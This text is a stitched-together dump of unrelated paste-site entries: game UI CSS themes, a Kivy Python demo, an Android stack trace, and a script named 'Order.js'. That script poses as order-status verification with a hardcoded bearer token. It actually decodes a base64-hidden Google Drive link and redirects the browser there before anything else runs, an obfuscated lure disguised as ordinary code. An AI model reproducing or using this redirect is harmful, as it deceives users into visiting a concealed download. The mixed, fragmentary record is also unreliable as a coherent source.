#selectorContainer, .classXPBar, .clsXPBarC{
    background-color: transparent;
}

.selectorItem.selectedItem, .selectorItem, .selectorItem:hover{
    background-color: transparent ;
    color:transparent;
    border:none !important;
}

.classImgH,.className{
display:none;
}

.classCard{
    width: 250px;
    height: 115px;
    box-shadow:3px 3px 0px #000;
}

 .selectorItem:hover{
filter: brightness(0.3);
}


/*クラスレベルxp配置*/


.classWeap{
   color:#000 !important;
   font-size: 23px;
   left:5px;
   top:5px;
   text-shadow: 
        -1px -1px 0 #fff,  
         1px -1px 0 #fff,
        -1px  1px 0 #fff,
         1px  1px 0 #fff;
}

.classLvl{
   font-size: 20px;
   color:#fff !important;
   bottom:20px;
   text-shadow: 1px 1px 0px #000;
}


.clsXPBarV{
    left:3px;
    font-size: 18px;
    text-border:none;
    text-align: left;
    text-shadow: 1px 1px 0px #000;
}


/*それぞれのクラス背景*/


.classCard[onclick=""selectClass(0)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201602565984256/194_20231129082317.PNG?ex=6578ec12&is=65667712&hm=26f3f13778c4fbc2a91271fa64b93ab3327586c1b1acda4a79ebc1bf3e4c4c14&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(1)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201605216780349/194_20231129081719.PNG?ex=6578ec13&is=65667713&hm=3a669bd785d2d61d26f7bf11434950da7caa089ae7a732c3b3a87262d4168018&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(2)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201605464236062/194_20231129081724.PNG?ex=6578ec13&is=65667713&hm=ab14953412d28e7a80cfee25b3b573c4ac2b1efaafc498632a14fd70c6ff5b50&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(3)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201605527142471/194_20231129081728.PNG?ex=6578ec13&is=65667713&hm=9d4f642682e28c05bbabfb772d5e73077183965b0521d4e971907aa7e282f750&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(4)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201605854298174/194_20231129081755.PNG?ex=6578ec13&is=65667713&hm=730eb5ec2b454bca08b629f48b7a17bc6eb4bb0573c10d98ea845919f78a8db8&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(5)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201606068215968/194_20231129081853.PNG?ex=6578ec13&is=65667713&hm=367c3d4d6f604b3223d68e285044ed51bad14b15768e325da100560fefc68308&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(6)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201606051430420/194_20231129082413.PNG?ex=6578ec13&is=65667713&hm=5d50de4da90d17c0c5b9c878e03de0918bf49e8d1274e7bc7f8d736085d4522f&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(7)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201605934010518/194_20231129081823.PNG?ex=6578ec13&is=65667713&hm=e3d29bd553f49f582108d44d4ecae09392d19f77885b0905a01b5747e39a4f35&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(8)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201607301337088/194_20231129082443.PNG?ex=6578ec13&is=65667713&hm=a4da8a09790b942cb6bf97d20def54a006dd52ffb592aad9ca869a76c7014dbb&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(9)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201607741743235/194_20231129082430.PNG?ex=6578ec13&is=65667713&hm=3624119afec91f681eb7893168268de8e3dc7049df84b1b2e528006c5117c6ce&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(10)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201607741743235/194_20231129082430.PNG?ex=6578ec13&is=65667713&hm=3624119afec91f681eb7893168268de8e3dc7049df84b1b2e528006c5117c6ce&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(11)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201607712395415/194_20231129082246.PNG?ex=6578ec13&is=65667713&hm=b33991c084638c92c1399bd45ac94c957a693fca0ab126d88c25f60cc2f0c7a8&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(12)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201608005976085/194_20231129082521.PNG?ex=6578ec13&is=65667713&hm=f2db3126b8f3aafb3f575c023e42ccbbd31ce7c4791c6f1db97ea77ec6e0aec3&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(13)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179201608647712788/194_20231129082501.PNG?ex=6578ec14&is=65667714&hm=24641fcfcd3f1177861a0e2f5429b4b8ec177b43d8e858157c00b8eff8a40ec1&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(14)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179324738116517898/194_20231129163517.png?ex=65795ec0&is=6566e9c0&hm=f011bbc2f0920c69efa80e803904ab7c2dbb4a30044c4049b72e4af33da18c5f&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}

.classCard[onclick=""selectClass(15)""] {
    background-image: url(https://cdn.discordapp.com/attachments/823344681328836618/1179328218243813438/194_20231129164905.png?ex=657961fe&is=6566ecfe&hm=0df599627ccdd6dbb18df59217b75bf23086fbb4ffffdf51a22ab7d49a335f42&);
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;    
    filter: brightness(1);
    border-radius: 0;
}


/*ホバー*/


.classCard:hover{
filter: brightness(0.3);
}


/*✅エンド*/


#endUI{
 background: linear-gradient(to bottom, rgba(182, 0, 51, 0.6), rgba(0, 0, 0, 0.6));
}

.endCard{
background-color: transparent;
    border: 2px solid #b60033;
    box-shadow: 3px 3px 0px #000;
    border-radius: 0;
}

.matchVote{
    background-color: transparent;
    border: 2px solid #b60033;
    box-shadow: 3px 3px 0px #000;
    border-radius: 0;
}


/*ゲームUI*/


/*✅消す*/


:root {
    --healthbar-opacity: 100; /* HPバーを完全に表示する */

    --div-grey: transparent;
    --div-black: transparent;
    --div-shadow: transparent;
}

#seasonLabel,
#mainlogo,
#mainLogoFace{
    display: none; /* メインロゴやシーズンラベル、メインロゴの顔を非表示にする */
}

#matchInfo.topLeftOld {
    display: none !important; /* 重要度を強調してマッチ情報を非表示にする */
}

#bottomLeftTeamType,
#bottomLeftTeamName,
#bottomLeftTeamHolder,
#bottomLeftClassImg{
    display: none; /* 下部の左側にある特定のチーム関連要素を非表示にする */
}

#recTimer{
    display: none; /* レコードタイマーを非表示にする */
}

#ammoMax, 
#maxHP{
    display: none; /* 弾薬と最大HPを非表示にする */
}

.weapSkin,
#timerIcon.topLeftOld  {
    display: none; /* 武器のスキンとタイマーアイコンを非表示にする */
}

.weapKey {
    display: none; /* 武器のキーを非表示にする */
}

.weapStreakHolder {
    display: none !important; /* 重要度を強調して武器の連続キルを非表示にする */
}

.classHP {
    display: none; /* クラスのHPを非表示にする */
}



/*✅時間*/


#timerVal.topLeftOld {
    font-size: 80px !important; /* タイマーのフォントサイズを80pxに設定 */
    top: 100px; /* 上部からの位置を100pxに設定 */
    color: #b60033; /* カラーを#b60033（赤色）に設定 */
    filter: drop-shadow(3px 3px #000); /* ドロップシャドウを3px右下に黒色で設定 */
}


/*✅左下*/


#bottomLeftPlayerRight {
    display: flex;
    align-items: center;
    padding: 3px;
    margin: 5px;
    background-color: var(--div-black); /* 背景色を --div-black に設定 */
}

#bottomLeftChallIcon {
    width: 50px; /* アイコンの幅を50pxに設定 */
    height: 50px; /* アイコンの高さを50pxに設定 */
    image-rendering: pixelated;
    image-rendering: -moz-crisp-edges;
    image-rendering: crisp-edges;
    display: inline-block;
    filter: brightness(0) drop-shadow(3px 3px #b60033); /* アイコンにドロップシャドウと明るさ調整を適用 */
    margin-bottom: -3px; /* マージンを調整して位置を微調整 */
}


/*✅体力*/


#bottomLeftHolder {
    bottom: 50px;
    left: 350px;
}

#bottomLeftHealthBar {
    position: fixed;
    background-color: transparent;
    width: 22%;
    bottom: 0%;
    left: 50%;
    transform: translate(-50%, -50%);
    visibility: visible !important;
}

#bottomLeftHealth {
    color: #b60033;
    font-size: 120px; /* フォントサイズを120pxに変更 */
    will-change: transform;
    margin-left: 20px;
    text-shadow: 3px 3px 0px #000;
}

.nHealthBarSeg {
    width: -webkit-fill-available;
    height: 30px;
    margin: 0 -5px;
    border-radius: 0;
    background-color: #000;
}

.nHpBSeg {
    border-radius: 0;
    box-shadow: none;
    background-color: #b60033 !important; /* HPバーセグメントの背景色を #b60033 に設定 */
}


/*✅弾*/


#ammoHolder {
   position: relative;
   bottom: 35px;
   right: 630px;
}

#ammoIcon {
   position: relative;
   bottom: 25px;
   left :-45px;
}


/*見た目*/


#ammoHolder {
    background-color:  transparent;
    display: inline-block;
    font-size: 120px;		/*大きさ変更*/
    letter-spacing: -2px;
    transform: translateZ(0);
}


#ammoIcon {
    width: 50px;     /* 大きさ変更 */
    height: 50px;    /* 大きさ変更 */
    margin-left: 3px;
    margin-bottom:12px;
    filter:brightness(0) drop-shadow(3px 3px #b60033);
}

#ammoVal{
     color: #b60033;
     text-shadow: 3px 3px 0px #000;
}


/*✅武器表示*/


/* 武器アイコンのスタイル設定 */


.weapIcon {
    width: 150px;
    height: auto;
    margin-right: 10px;
    margin-bottom: 20px;
    transition-duration: 0.5s;
    filter: brightness(0) drop-shadow(3px 3px #b60033);
}


/* 最後の武器アイテムのアイコンに対するスタイル */


.weapItem:last-child .weapIcon {
    transform: translateY(16px);
}



/* リロードメッセージのスタイル設定 */


#reloadMsg {
    background: transparent !important;
    bottom: 160px !important;
    font-size: 16px;
    border: none !important;
}


/* 武器ホルダーの位置調整 */


#weapHolder {
    bottom: 10px;
}


/* 武器アイテムとその内部要素の背景色を透明にする */


.weapItemInner, .weapItem {
    background-color: transparent;
}


/*✅チャットボックス*/


/* ゲーム中のチャット入力を非表示にする */
#uiBase.onGame #chatInput {
    display: none;
}

/* ゲーム中のチャットホルダーのスタイル設定 */
#uiBase.onGame #chatHolder {
    background: transparent;
    top: 300px;
    width: 300px;
}

/* チャットスイッチと音声オフアイコンの表示を非表示にする */
#chatSwitch:after, .voiceOff:after {
    display: none;
}

/* チャットリストのスクロールバーを非表示にする */
#chatList::-webkit-scrollbar {
    display: none;
}

/* チャットリストのスタイル設定 */
#chatList {
    background-color: transparent;
    font-size: 10px !important;
}

/* 敵のチャットメッセージの文字色を設定 */
.chatMsg span[style*=""#eb5656""] {
    color: #000 !important;
}

/* 味方のチャットメッセージの文字色を設定 */
.chatMsg span[style*=""#9eeb56""] {
    color: #fff !important;
}

/* その他のチャットメッセージの文字色とテキストシャドウを設定 */
.chatMsg[style*=""color""] {
    color: #b60033 !important;
    text-shadow: 1px 1px 0px #000;
}


/*✅リーダーボード*/


/* リーダーコンテナのスタイル設定 */


#leaderContainer {
    border: 2px solid #b60033;  
    box-shadow: 3px 3px 0px #000;
}


/* センターリーダーコンテナのスタイル設定 */


.centerLeaderContainer {
    border: 2px solid #b60033;  
}


/* 新しいリーダーアイテムのフォントサイズ設定 */


.newLeaderItem {
    font-size: 20px;
}


/* リーダーアイテムのフォントサイズ設定 */


.leaderItem {
    font-size: 22px;
}


/* 自分のリーダー名、テキストのスタイル設定 */


.newLeaderNameM, .leaderNameM, .endTableM {
    color: #b60033;
}


/* 味方のリーダー名、テキストのスタイル設定 */


.newLeaderNameF, .leaderNameF, .endTableN {
    color: #fff;
}


/* 敵のリーダー名、テキストのスタイル設定 */


.newLeaderName, .leaderName, .endTableN[style*=""#eb5656""] {
    color: #000;
}


/* トップライトのカウンターのスタイル設定 */


topRightCounters {
    color: #b60033;
    text-shadow: 2px 2px 0px #000;
}


/* 各種カウンターの数値のスタイル設定 */


#killsVal, #deathsVal, #streakVal, #myScoreVal, #kdVal {
    color: #b60033;
    text-shadow: 1px 1px 0px #000;
}


/* 各種カウンターのアイコンのスタイル設定 */


#killsIcon, #deathsIcon, #streakIcon, #kdIcon {
    filter: brightness(0) drop-shadow(1px 1px #b60033);
}


/*コンプメニュー*/


/*✅透明*/


#compClassPHolder, #compBtnLst, #compT1Scr, #compT2Scr{
   background-color :transparent;
}


/*✅スコア*/


/*全体*/


#compTScrsB{
   top:80px;
   left:50%;
   transform: translateX(-50%);
   background-color: #b60033;
   box-shadow: 3px 3px 0px #000;
   border-radius: 0;
   width: fit-content; 
}


/*左(Alpha)*/


#compT1Scr{
   color:#fff !important;
   text-shadow: none;
   filter: drop-shadow(3px 3px #000);
}


/*真ん中(vs)*/


.compTScrB{
   background: rgba(0,0,0,0) !important ;
   filter: drop-shadow(2px 2px #fff);
}

.compTScrB span{
   color:#000 !important;
}


/*右(Bravo)*/


#compT2Scr{
   color:#fff !important;
   text-shadow: none;
   filter: drop-shadow(3px 3px #000);
}


/*✅左下*/


/*位置*/


 #compBtnLst{
    top: 450px;
    left:30px;
    width: 100px;
    height: 1000px;
    display: flex;
    flex-direction: column;
}


/*見た目*/


.compMenBtnS{
    width: fit-content;
    height: fit-content;
    background-color: transparent !important;
    border: 0;
    margin-top:17px;
}

.compMenBtnS span{
    font-size: 60px !important;
    filter: drop-shadow(-3px -1px 0px #000) drop-shadow(3px -1px 0px #000) drop-shadow(0px 3px 0px #000) drop-shadow(3px 3px #b60033);
}


/*✅クラス選択*/


/*位置*/


#compClassPHolder{
    top:-18px;
    right:50px;
    width: 100px;
    height: 1000px;
    display: flex;
    flex-direction: column;
}

/*見た目*/

.compClassPItm{
    width: 80px;
    height: auto;
    background-color: transparent;
    border: 0;
    margin-top:17px;
    filter: drop-shadow(-3px -1px 0px #000) drop-shadow(3px -1px 0px #000) drop-shadow(0px 3px 0px #000) drop-shadow(3px 3px #b60033);
}


/*✅マップ情報*/


#cmpDatBox{
   border-left: none;
   left:50%;
   transform: translateX(-50%);
   bottom:70px;
   text-align: center;
   text-shadow: 3px 3px 0px #000;
   color: #b60033;
   font-size:40px;
}

#cmpDatSub{
    font-size:30px;
}


/*✅waiting*/


#compTimBox{
top:20px;
}


/*✅チーム名*/


.cmpTmHed{
   text-shadow: 3px 3px 0px #000;
   color: #b60033;
   font-size:70px
}



/*✅joinボタン*/


.compSwpTmB{
   background-color: #b60033 !important;
   border:none;
   box-shadow: 3px 3px 0px #000;
   border-radius: 0;
}


/*✅アイコンまわり*/


.compPLstIcn{
   border:3px solid #b60033 !important;
   box-shadow: 3px 3px 0px #000;
   border-radius: 0;
}"
iZ7zBhEM,Untitled,ElliotDG,Python,Wednesday 9th of April 2025 09:36:53 AM CDT,"from kivy.app import App
from kivy.lang import Builder
from kivy.uix.scatter import Scatter

kv = r'''
BoxLayout:
    orientation:""vertical""
    Button:
        size_hint_y: None
        height: dp(48)
        text: ""Top, press to reset""
        id: top
        on_release: 
            scatter.scale = 1
            scatter.center = scatter_container.center

    FloatLayout:
        id:scatter_container
        orientation:""vertical""
        CustomScatter:
            id: scatter
            size_hint: None, None
            size: image.size
            auto_bring_to_front : False
            scale_min: 1
            do_translation : True
            do_rotation: False
            do_scale: True
            center: scatter_container.center
            Image:
                id: image
                source: 'kivy-icon-256.png'
                size_hint:None,None
                size: self.texture_size
                opacity: 0.7
                
    Button:
        text: ""Bottom""
        id: bottom
        size_hint_y: None
        height: dp(48)
'''

class CustomScatter(Scatter):

    def on_touch_move(self, touch):
        if touch.grab_current is self:
            app = App.get_running_app()
            top = app.root.ids.top
            bottom = app.root.ids.bottom

            if self.top > top.y:
                print('top out of bounds')
                self.top = top.y
                return
            if self.y < bottom.top:
                self.y = bottom.top
                return
        super().on_touch_move(touch)

    def transform_with_touch(self, touch):
        app = App.get_running_app()
        top = app.root.ids.top
        bottom = app.root.ids.bottom

        if self.collide_widget(top):
            print('xform top')
            if touch.dy >= 0:
                return

        if self.collide_widget(bottom):
            print('xform bottom')
            if touch.dy <= 0:
                return
        return super().transform_with_touch(touch)

class MyApp(App):
    def build(self):
        return Builder.load_string(kv)

MyApp().run()
"
yxpZwE6z,Jitchu CSS,PhantomGame,CSS,Wednesday 9th of April 2025 09:36:20 AM CDT,"/* css made by jitchu */
/* discord: jitchu */
/* twitter: JitchuFPS */
/* futher info about the css feel free to contact me */
@import url(https://jitchudev.github.io/jitchu-css/regret.css);

:root{
    --pic: url(https://cdn.discordapp.com/attachments/865988103977828412/1122834732795838556/5477eac537ae12a07db1ebb4ce76d5a7.jpg);
    --bgpic: url(https://cdn.discordapp.com/attachments/865988103977828412/1127335752099971092/anime-male.gif);
}"
hgGT7Qn4,Thaddeuz CSS,PhantomGame,CSS,Wednesday 9th of April 2025 09:34:14 AM CDT,"/* (extra clean v3) thaddeuz css by https://www.youtube.com/@thaddeuz_ */
/* Please credit me if you want to redistribute this code as part of your code. */

/* Updated: 27/09/2024 */

:root {
      --div-grey: transparent;
      --div-black: transparent;
      --text-shadow: 2px 2px 3px rgba(30, 30, 30, .5)
  }
    
     /* font */
  
  @font-face {
        font-family: gamefont;
        src: url(https://dl.dropboxusercontent.com/scl/fi/msn19ofgvofwm12oqt182/Montserrat-Regular.ttf?rlkey=2q0iowy5xlg5db9v7pxyfcvqc&dl=0)
  }
  
  /* menu css */
  
     /* bottom hover cred shotzz css */
  
  #subLogoButtons {
        position: absolute !important;
        display: flex !important;
        flex-direction: row !important;
        transform: translateY(210px);
        left: calc(50% - 250px) !important;
        transition: 1.8s !important
  }
  
  #subLogoButtons::before {
        content: '';
        border-left: 1000px solid #ff000000 !important;
        border-bottom: 240px solid #ff000000 !important;
        border-right: 1000px solid #ff000000 !important;
        position: absolute !important;
        bottom: 60px !important;
        right: -600px !important;
        pointer-events: auto !important
  }
  
  #subLogoButtons:hover {
        transform: translateY(0px);
        transition: 0.5s !important
  }
  
  .button, .button:hover { 
        background-color: transparent !important;
        border: hidden !important
  }
  
     /* top left */
  
  #mLevelCont, .headerBarLeft, .headerBarRight {
        background-color: transparent
  }
  
  #menuAccountUsername {
        font-size: 23px;
        padding-top: 4px;
        padding-left: 6px
  }
  
  .verticalSeparator {
        opacity: 0
  }
  
  .progressBar {
        height: 8px;
        margin-top: -4px;
        background-color: rgba(0, 0, 0, 0.15)
  }
  
  .progressBarInner {
        background-image: linear-gradient(to right,lightslategray, white)
  }
  
  #mailContainer {  
        padding-bottom: 3px
  }
  
  #mLevelContV {
        font-size: 60px
  }
  
  .krInfo {
        font-size: 20px !important;
        position: fixed;
        top: 89px;
        left: 20px
  }
  
  .junkInfo {
        font-size: 20px !important;
        position: fixed;
        top: 94px;
        left: 140px
  }
  
     /* left */
  
  .material-icons-outlined, span.material-symbols-outlined {
        color: white !important
  }
  
  #menuItemContainer {
        background: transparent
  }
  
     /* hud class popup */
  
  #menuClassContainer:hover #classPreviewCanvas {
        transform: unset !important
  }
  
  #classPreviewCanvas {
        transform: translateY(5000000px);
        margin-bottom: -135px;
        margin-right: -180px
  }
  
  #customizeButton {
        font-size: 700px!important;
        opacity: 0
  }
  
     /* remove click to play animation */
  
  #instructions {
        animation: none
  }
  
     /* removal */
     
  #matchInfo.topLeftOld,
  #timerIcon, 
  #bottomLeftClassImg, #bottomLeftHealth, #bottomLeftTeamHolder, #bottomLeftChallIcon,
  #voiceIcon, #recTimer, #chatSwitch,
  #ammoMax, #ammoIcon, #weapHolder, 
  #aHolder, .endAHolder, #topRightAdHolder, #tlInfHold, .menuSocialB, 
  #seasonLabel, #termsInfo, #streamContainer, #mapInfoHld,
  #mainLogo, #mainLogoFace, #policeButton, #menuMiniProfilePic,
  #menuClassSubtext, #menuClassName, #menuClassIcn, #customizeButton .material-icons,
  .menuItem .menuItemTitle,
  #editorBtnM {
        display: none !important
  }
  
     /* health bar */
  
  #bottomLeftHealthBar {
        width: 200px;
        position: fixed;
        left: calc(50% - 110px);
        bottom: 25px
  }
  
  .nHealthBarSeg {
        height: 21px;
        margin: 0 -3.88px;
        background:transparent
  }
  
     /* ammo (inspo from jitchu and angel wings) */
  
  #ammoHolder {
        position: fixed;
        top: calc(50% + 35px);
        left: calc(50% - 30px);
        transform: unset;
        height: 7px;
        width: 60px;
        background-image: linear-gradient(to right,rgb(255 255 255),rgb(255 255 255))
  }
  
  #ammoVal {
        font-size: 40px;
        display: inline-block;
        position: fixed;
        left: calc(50% + 110px);
        bottom: 22px;
        text-shadow: var(--text-shadow)
  }
  
     /* counters */
  
  #killsVal,#deathsVal,#streakVal,#myScoreVal,#kdVal {
        color: white;
        font-size: 30px;
        text-shadow: var(--text-shadow)
  }
  
  #killsIcon,#deathsIcon,#streakIcon,#kdIcon {
        width: 25px;
        height: 25px
  }

  #leaderContainer {
        text-shadow: var(--text-shadow)
  }
  
     /* fps and ping */

  #fpsDisplay {
        padding-top: 12px;
  }

  #menuFPSDisplay,#menuFPS,#ingameFPS,#fpsDisplay,
  #menuPingText,#menuPingDisplay .material-icons,#pingDisplay,#pingText {
        color: rgb(255, 255, 255) !important;
        text-shadow: var(--text-shadow)
  }
  
    /* chat */
  
  #chatInput {
        background-color: transparent;
        position:absolute;
        left:0px;
        border: 2px solid transparent;
        text-shadow: var(--text-shadow)
  }
  
  #chatList {
        background-color: transparent
  }
  
  .chatItem {
        font-size: 18px;
        max-width: 265px;
        text-shadow: var(--text-shadow)
  }
    
  .chatItem span[style=""color:#fc03ec""] {
        color: #eb8787 !important
  }
  
  #uiBase.onGame #chatHolder {
        bottom: 18px
  }
  
    /* settings */
  
  .settName,.settNameSmall {
        color: white !important
  }
  
  #menuWindow.dark,
  .settingsHeader,
  .settingsBtn{
        background-color: black
  }
  
  input[type=color],
  .setHed {
        border: 4px solid #d5bfff;
        background-color: black
  }
  
  input:checked+.slider {
        background-color: #d5bfff
  }
#policeButton {
    display: inline-block !important;
    border: none !important;
}"
nDaYHRjR,2025-04-09T17:31:02.995,powerampache,PHP,Wednesday 9th of April 2025 09:31:02 AM CDT,"1.00-64 (64) - DB: 82
java.lang.NullPointerException
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleEverything(SongsRepositoryImpl.kt:593)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleEverything(SongsRepositoryImpl.kt:77)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleEverything$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:108)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:793)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:697)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:684)

"
FMn3d9V2,Order.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 09:24:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28689/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3X44fctd,Comp CSS,PhantomGame,CSS,Wednesday 9th of April 2025 09:12:33 AM CDT,":root {
    --Watermark: ""itserror430"";
}
/* Css based off of groot css by 7soff ty man*/
/* Removal */

#aHolder,
#topRightAdHolder,
.endAHolder,
#merchImg,
#onetrust-consent-sdk,
#braveWarning,
#newsHolder,
#streamContainer,
#newUserGuide,
#krDiscountAd,
#updateAd, 
#editorBtnM,
.verticalSeparator,
.terms.standout,
.verticalSeparatorInline,
.terms,
#termsInfo,
.menuWindowSideL,
.windowHeader,
.menuSocialB,
#menuBtnProfile,
#menuBtnShop,
#menuBtnChall,
#menuBtnSocial, 
#policeButton,
#menuBtnMaps,
#menuBtnMods,
#menuBtnSettings,
#mainLogo,
#freeKRAd,
#rankedBlog,
#doubleXPAd,
#seasonLabel,
#menuClassNameTag,
#doubleClassXPAd,
#mainLogoFace,
.menuItem[onclick$=""showWindow(49)""],
#tlInfHold,
.newsItem,
#bottomLeftChallIcon,
#timerIcon,
#recTimer,
.weapKey, 
.weapSkin,
.weapStreak, 
.weapStreakHolder,
#bottomLeftTeamType, 
#voiceIcon,
#classPreviewCanvas,
#chatSwitchHolder,
#bottomLeftTeamName,
#menuClassIcn,
#myScoreVal,
#kdVal,
#ammoMax,
#killsIcon,
#ammoIcon,
#deathsIcon,
#streakIcon,
#scoreCount .material-icons,
#livesCount .material-icons,
#reloadMsg {
   display: none !important;
}


/* Removal V2 */

.button,
#menuItemContainer,
#mLevelCont,
#bottomLeftPlayer,
#bottomLeftPlayerLeft,
#bottomLeftPlayerRight,
#bottomLeftTeamType,
#bottomLeftTeamName,
#chatInputHolder,
.greyInner, 
.greyInlineInner, 
.greyInlineInnerMid,
#mLevelCont,
.headerBarLeft,
.headerBarRight,
.weapItemInner,
.weapItem,
#leaderContainer,
#bottomLeftHealthBar {
background-color: transparent;
}

/* Removal V3 */
.button, 
.button:hover { 
border: hidden ! important;
}

/* Removal V4 */

#matchInfo {
visibility: hidden !important;
}

/* Useless Change */

#instructions {
position: absolute;
font-size: 15px;
animation: none;
}

/* Game Font */

@font-face {
font-family: gamefont;
src: url(https://fonts.gstatic.com/s/montserrat/v15/JTURjIg1_i6t8kCHKm45_dJE3gnD_g.woff2);
}


/* Weapon */

#weapHolder {
display: flex;
bottom: 40%;
transform: translateY(50%);
}


/* Health */


#bottomLeftHealthBar {
width: 300px;
height: 33px;
display: inline-flex;
justify-content: center;
background-color: transparent;
border-radius: 1;
position: fixed;
left: calc(50% - 160px);
bottom: 50px;
outline: 9px solid var(--hp-ammo);
filter: drop-shadow(7px 7px 3px rgba(30, 30, 30, .5));
visibility: visible !important;
}

.nHealthBarSeg {
width: -webkit-fill-available;
height: 30px;
margin: 0 -5px;
border-radius: 0;
background-color: transparent;
}

.nHpBSeg {
border-radius: 0;
box-shadow: none;
}


#bottomLeftHealth {
color: #fff;
font-size: 125px;
will-change: transform;
display: inline-block;
text-shadow: 7px 7px 3px rgba(30, 30, 30, .5);
letter-spacing: 2px;
visibility: visible !important;
background-color: transparent;
position: fixed;
left: calc(35%);
bottom: 5px;
}


/* Ammo */

#ammoHolder {
position: fixed;
background-color: transparent;
background-image:linear-gradient(to right,white,white);
transform: unset;
width: 35px;
height: 4px;
size: 20px;
top: calc(50% + 25px);
left: calc(49%);


}

#ammoVal {
text-shadow: 7px 7px 3px rgba(30, 30, 30, .5);
position: fixed;
font-size: 125px;
left: calc(57%);
bottom: 5px;
color: white;
letter-spacing: 2px;
}

/* Leader */

.leaderScore,
.leaderCounter {
    color: white;
} 

#leaderboardHolder::before {
content: ""leaderboard"";
text-transform: capitalize;
display: flex;
font-size: 20px;
   color: #fff;
margin-top: 8px;
margin-left: calc(30%);
background-color: transparent;
}
/* Counters */

#killsVal,
#deathsVal,
#streakVal {
color: white !important;
bottom: 7px;
font-size: 26px;
display: flex;
justify-content: center;
text-shadow: 2px 2px 3px rgba(30, 30, 30, .5);
border-radius: 5px 5px 5px 5px;
padding: 0px 5px 0px 0px;
}


#deathsVal::after {
content: 'D';
transform: translateX(25%);
color: gray;   
}

#killsVal::after {
   content: 'K';
   transform: translateX(25%);
color: gray;
}

#streakVal::after {
content: 'S';
transform: translateX(25%);
color: gray;
}

/* Timer */

